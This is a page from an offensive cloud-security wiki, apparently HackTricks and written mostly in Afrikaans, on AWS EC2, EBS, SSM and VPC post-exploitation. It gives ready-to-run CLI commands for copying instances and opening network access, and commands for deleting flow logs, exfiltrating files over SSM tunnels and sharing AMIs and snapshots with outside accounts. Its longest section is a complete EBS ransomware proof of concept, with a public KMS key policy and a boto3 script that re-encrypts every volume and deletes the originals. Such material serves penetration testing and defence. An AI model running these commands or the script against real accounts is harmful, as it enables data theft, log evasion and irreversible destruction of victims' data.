# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Vir meer inligting, kyk:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring dupliseer inkomende en uitgaande verkeer vir EC2 instances binne 'n VPC sonder dat daar iets op die instances self geïnstalleer hoef te word. Hierdie gedupliseerde verkeer word gewoonlik na iets soos 'n network intrusion detection system (IDS) gestuur vir ontleding en monitering.\
'n Aanvaller kan dit misbruik om al die verkeer vas te vang en sensitiwe inligting daaruit te bekom:

Vir meer inligting, sien hierdie bladsy:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Kopieer lopende Instance

Instances bevat gewoonlik sensitiwe inligting. Daar is verskillende maniere om binne te kom (sien [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Nog 'n manier om te kyk wat dit bevat, is om **'n AMI te skep en 'n nuwe instance (selfs in jou eie rekening) daarvan te laat loop**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, wat gewoonlik **gevoelige inligting** sal bevat, daarom behoort die nagaan daarvan hierdie inligting te openbaar.\
As jy 'n **volume without a snapshot** vind, kan jy: **Create a snapshot** en die volgende aksies uitvoer of dit bloot **mount it in an instance** binne die rekening:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Exporteer 'n EC2 AMI direk na S3 met `CreateStoreImageTask` om 'n rou skyfbeeld te kry sonder snapshot sharing. Dit maak volledige offline forensiese ondersoek of data-diefstal moontlik terwyl die instance se netwerking onaangeraak bly.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Koppel 'n io1/io2 Multi-Attach volume aan 'n tweede instance en mount dit read-only om live data af te tap sonder snapshots. Nuttig wanneer die slagoffer-volume reeds Multi-Attach binne dieselfde AZ geaktiveer het.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Skep 'n EC2 Instance Connect Endpoint, authorize ingress, en injekteer ephemeral SSH keys om private instances oor 'n managed tunnel te bereik. Gee vinnige lateral movement paaie sonder om publieke porte te open.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Skuif 'n slagoffer ENI se secondary private IP na 'n attacker-controlled ENI om vertroude hosts te imiteer wat per IP allowlisted is. Dit maak dit moontlik om interne ACLs of SG rules wat aan spesifieke adresse gekoppel is te omseil.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Hervassosieer 'n Elastic IP van die slagoffer-instance na die aanvaller om inkomende verkeer te onderskep of uitgaande verbindings te begin wat lyk asof dit van vertroude openbare IPs afkomstig is.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

As 'n security group rule na 'n customer-managed prefix list verwys, brei die toevoeging van attacker CIDRs by die lys stilletjies die toegang oor elke afhanklike SG rule uit sonder om die SG self te verander.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Skep gateway of interface VPC endpoints om weer outbound toegang vanaf geïsoleerde subnets te kry. Die benutting van AWS-managed private links omseil ontbrekende IGW/NAT kontroles vir data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

'n aanvaller met die ec2:AuthorizeSecurityGroupIngress permission kan inbound rules by security groups voeg (byvoorbeeld die toelating van tcp:80 vanaf 0.0.0.0/0), en sodoende interne dienste blootstel aan die public Internet of andersins ongemagtigde netwerke.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
'n Aanvaller met ec2:ReplaceNetworkAclEntry (of soortgelyke) regte kan die subnet se Network ACLs (NACLs) wysig om hulle baie permissief te maak — byvoorbeeld deur 0.0.0.0/0 op kritieke poorte toe te laat — en sodoende die hele subnet-reeks aan die Internet of aan ongemagtigde netwerksegmente bloot te stel. Anders as Security Groups, wat per-instance toegepas word, word NACLs op subnetvlak toegepas, so die verandering van 'n beperkende NACL kan 'n baie groter slagveldstraal hê deur toegang tot baie meer hosts moontlik te maak.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

'n Aanvaller met ec2:Delete* en iam:Remove* toestemmings kan kritieke infrastruktuurbronne en -konfigurasies verwyder — byvoorbeeld key pairs, launch templates/versions, AMIs/snapshots, volumes of attachments, security groups of rules, ENIs/network endpoints, route tables, gateways, of managed endpoints. Dit kan onmiddellike diensonderbreking, data verlies, en verlies van forensiese bewyse veroorsaak.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Wys VPC Flow Logs na 'n attacker-controlled S3 bucket om netwerkmetadata (source/destination, ports) deurlopend buite die slagoffer rekening te versamel vir langtermyn reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Selfs as jy 'n EC2 toesluit sodat geen verkeer kan uitgaan nie, kan dit steeds **exfil via DNS**.

- **VPC Flow Logs sal dit nie rekordeer nie**.
- Jy het geen toegang tot AWS DNS logs nie.
- Deaktiveer dit deur "enableDnsSupport" op false te stel met:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

'n aanvaller kan API endpoints van 'n rekening wat hy beheer aanroep. Cloudtrail sal hierdie oproepe log en die aanvaller sal die exfiltrate data in die Cloudtrail logs kan sien.

### Open Security Group

Jy kan verdere toegang tot netwerkdienste kry deur poorte so oop te maak:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc na ECS

Dit is moontlik om 'n EC2-instansie te laat loop en dit te registreer sodat dit gebruik kan word om ECS-instansies te laat loop, en dan die ECS-instansies se data te steel.

Vir [**meer inligting, sien dit hier**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Verwyder VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Vereiste permissies:

- `ssm:StartSession`

Benewens command-uitvoering, laat SSM toe vir traffic tunneling wat misbruik kan word om te pivot vanaf EC2 instances wat nie netwerktoegang het nie as gevolg van Security Groups of NACLs.
Een van die scenario's waar dit nuttig is, is om te pivot vanaf 'n [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) na 'n private EKS cluster.

> Om 'n sessie te begin, moet die SessionManagerPlugin geïnstalleer wees: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Installeer die SessionManagerPlugin op jou masjien
2. Teken in op die Bastion EC2 met die volgende opdrag:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Kry die Bastion EC2 AWS tydelike credentials met die [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) skrip
4. Skuif die credentials na jou eie masjien in die `$HOME/.aws/credentials` lêer as die `[bastion-ec2]` profiel
5. Teken in by EKS as die Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Werk die `server`-veld in die `$HOME/.kube/config` lêer by om na `https://localhost` te wys
7. Skep 'n SSM-tunnel soos volg:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Die verkeer van die `kubectl`-tool word nou deur die SSM-tunnel via die Bastion EC2 gelei en jy kan die privaat EKS-kluster vanaf jou eie masjien bereik deur die volgende uit te voer:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Let wel dat SSL-verbindinge sal misluk tensy jy die `--insecure-skip-tls-verify ` vlag stel (of die ekwivalent in K8s audit tools). Aangesien die verkeer deur die veilige AWS SSM-tunnel getonnel word, is jy beskerm teen enige vorm van MitM-aanvalle.

Laastens, hierdie tegniek is nie beperk tot die aanval op privaat EKS-klusters nie. Jy kan arbitrêre domeine en poorte instel om te pivot na enige ander AWS-diens of 'n aangepaste toepassing.

---

#### Vinnige Lokale ↔️ Remote Port Forward (AWS-StartPortForwardingSession)

As jy slegs een TCP-poort vanaf die EC2-instansie na jou lokale host hoef te forward, kan jy die `AWS-StartPortForwardingSession` SSM dokument gebruik (geen remote host parameter benodig nie):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Die opdrag stel 'n tweerigting tonnel in tussen jou werksstasie (`localPortNumber`) en die geselekteerde poort (`portNumber`) op die instansie **sonder om enige inkomende Security-Group-reëls oop te maak**.

Algemene gebruiksgevalle:

* **File exfiltration**
1. Op die instansie begin 'n vinnige HTTP-server wat na die gids wys wat jy wil exfiltrate:

```bash
python3 -m http.server 8000
```

2. Vanaf jou werksstasie haal die lêers deur die SSM-tonnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Toegang tot interne webtoepassings (bv. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Wenk: Komprimeer en enkripteer bewyse voordat jy dit exfiltrating, sodat CloudTrail nie die clear-text inhoud log nie:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Deel AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Soek sensitiewe inligting in openbare en private AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel is 'n tool ontwerp om **soek sensitiewe inligting binne openbare of private Amazon Machine Images (AMIs)**. Dit outomatiseer die proses om instances vanaf target AMIs te launch, hul volumes te mount, en te scan vir potensiële secrets of sensitiewe data.

### Deel EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

'n bewys van konsep (PoC) soortgelyk aan die Ransomware-demonstrasie in die S3 post-exploitation notes. KMS behoort hernoem te word na RMS (Ransomware Management Service) weens hoe maklik dit is om verskeie AWS-dienste daarmee te enkripteer.

Eerstens, vanaf 'attacker' AWS account, skep 'n customer managed key in KMS. Vir hierdie voorbeeld sal ons AWS net die sleuteldata bestuur, maar in 'n realistiese scenario sou 'n malicious actor die sleuteldata buite AWS' beheer behou. Verander die key policy om enige AWS account Principal toe te laat om die sleutel te gebruik. Vir hierdie key policy was die account's name 'AttackSim' en die policy rule wat alle toegang toelaat, word 'Outside Encryption' genoem.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Die sleutelbeleid-reël benodig die volgende aangeskakel om die vermoë te hê om dit te gebruik om `n EBS` volume te enkripteer:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Nou met die publiek-toeganklike sleutel om te gebruik. Ons kan `n 'victim' account` gebruik wat 'n paar EC2-instanse opgeroep het met nie-gekodeerde EBS-volumes aangeheg. Hierdie `victim` account se EBS-volumes is wat ons teiken vir enkripsie; hierdie aanval is onder die veronderstelde oortreding van 'n hoë-privilegie AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Soortgelyk aan die S3 ransomware voorbeeld. Hierdie aanval sal kopieë van die aangehegte EBS-volumes skep met behulp van snapshots, die publiek beskikbare sleutel van die `attacker` account gebruik om die nuwe EBS-volumes te enkripteer, dan die oorspronklike EBS-volumes van die EC2-instanse loskoppel en uitvee, en uiteindelik die snapshots verwyder wat gebruik is om die nuut-enkodeerde EBS-volumes te skep. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Dit lei daartoe dat slegs enkripteerde EBS-volumes in die account beskikbaar oorbly.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Verder is dit die moeite werd om te noem dat die skrip die EC2-instanse gestop het om die oorspronklike EBS-volumes los te koppel en uit te vee. Die oorspronklike nie-gekodeerde volumes is nou weg.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Gaan dan terug na die sleutelbeleid in die `attacker` account en verwyder die `Outside Encryption` policy rule uit die sleutelbeleid.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Wag 'n oomblik totdat die pas gestelde sleutelbeleid versprei. Keer dan terug na die 'victim' account en probeer om een van die pas-geënkripteerde EBS volumes aan te heg. Jy sal vind dat jy die volume kan aanheg.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Maar wanneer jy probeer om die EC2 instance weer te begin met die geënkripteerde EBS volume, sal dit net misluk en van die 'pending' state terug na die 'stopped' state gaan vir ewig, aangesien die aangehegte EBS volume nie met die sleutel ontsleutel kan word nie omdat die sleutelbeleid dit nie meer toelaat nie.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Dit is die python skrip wat gebruik is. Dit neem AWS creds vir 'n 'victim' account en 'n publiek beskikbare AWS ARN waarde vir die sleutel wat vir enkripsie gebruik gaan word. Die skrip sal geënkripteerde kopieë maak van AL die beskikbare EBS volumes wat aan AL die EC2 instances in die geteikende AWS account gekoppel is, dan elke EC2 instance stop, die oorspronklike EBS volumes loskoppel, dit verwyder, en uiteindelik al die snapshots wat tydens die proses gebruik is verwyder. Dit sal slegs geënkripteerde EBS volumes in die geteikende 'victim' account loslaat. GEBRUIK HIERDIE SKRIP SLEGS IN 'N TOETSOMGEWING, DIT IS DESTRUKTIEF EN SAL AL DIE ORIGINELE EBS VOLUMES VERWYDER. Jy kan hulle herstel deur die gebruikte KMS key te gebruik en hulle via snapshots na hul oorspronklike toestand te herstel, maar ek wil jou net bewus maak dat dit uiteindelik 'n ransomware PoC is.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Verwysings

- [Pentest Partners – Hoe om lêers in AWS met behulp van SSM oor te dra](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
